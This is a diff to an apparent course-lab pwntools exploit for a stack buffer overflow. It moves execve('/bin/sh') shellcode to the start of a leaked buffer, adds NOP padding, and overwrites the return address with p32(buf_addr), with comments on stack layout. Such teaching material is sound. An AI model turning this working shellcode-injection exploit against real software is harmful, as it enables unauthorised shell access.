@@ -3,13 +3,16 @@
 
 Key pwntools:
   shellcraft.sh() + asm() : execve("/bin/sh") shellcode bytes
-  NOP sled (b'\\x90'*n)     : absorb landing-address slack (lecture "NOP Sled")
   p32(addr)               : return address as little-endian 4 bytes
   recvline / int(...,16)  : parse the buf address the program leaks
 
 Layout inside buf:
-  [ NOP sled .......... ][ shellcode ][ return addr = start of buf ]
-  Returning lands at the start (NOPs) and slides down into the shellcode.
+  [ shellcode ][ NOP padding .......... ][ return addr = start of buf ]
+  We return to the start of buf, straight into the shellcode. The shellcode
+  sits at the BOTTOM of buf (low address) on purpose: when main returns, ESP
+  is just above buf and its pushes grow downward, so shellcode at the top
+  (next to ESP) would clobber its own tail before executing. At the bottom it
+  stays clear. (The NOP padding is just filler to reach the return address.)
 
 Run:  cd example3 && make && python3 solution3/solve_vuln2.py
 
@@ -47,10 +50,13 @@ def main():
     io.recvuntil(b"payload:\n")
 
     shellcode = asm(shellcraft.sh())          # execve("/bin/sh", 0, 0)
-    # Put shellcode at the end of the buffer, NOP sled in front of it.
-    payload = b"\x90" * (offset - len(shellcode)) + shellcode
+    # Shellcode goes at the START of buf, NOP padding after it. ESP sits just
+    # ABOVE buf when main returns, so its pushes grow DOWN toward buf's top --
+    # shellcode at the top (adjacent to ESP) would overwrite its own tail
+    # before it runs. Placing it at the bottom keeps it clear of ESP.
+    payload = shellcode + b"\x90" * (offset - len(shellcode))
     assert len(payload) == offset, "shellcode larger than the buffer"
-    payload += p32(buf_addr)                   # return to buf start (NOP sled) -> shellcode
+    payload += p32(buf_addr)                   # return to buf start = shellcode
 
     io.sendline(payload)
     log.success("shellcode injected -- checking for a shell")
